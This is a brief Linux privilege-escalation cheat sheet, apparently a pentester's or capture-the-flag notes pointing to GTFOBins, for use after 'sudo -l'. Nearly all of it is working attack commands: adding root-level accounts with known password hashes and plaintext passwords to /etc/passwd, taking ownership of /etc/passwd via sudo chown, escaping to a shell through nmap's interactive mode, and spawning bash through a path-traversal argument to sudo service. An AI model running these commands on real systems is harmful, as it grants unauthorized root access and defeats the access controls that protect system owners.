Tricks to play after running `sudo -l`
https://gtfobins.github.io/

## Change passwd file
```
hack:$1$-hack$cP2Gt085ove2RDgBPWMR2/:0:0:root:/root:/bin/bash
su hack
Password: pass123
```

## Chown
```
sudo chown asterisk:asterisk /etc/passwd
echo "flame:sa/zAjIC0QWtk:0:0::/root/:/bin/bash" >> /etc/passwd
su - flame
Password: flamen
```

## nmap
```
sudo nmap --interactive
!sh
```

## service
```
sudo /sbin/service ../../../bin/bash
```
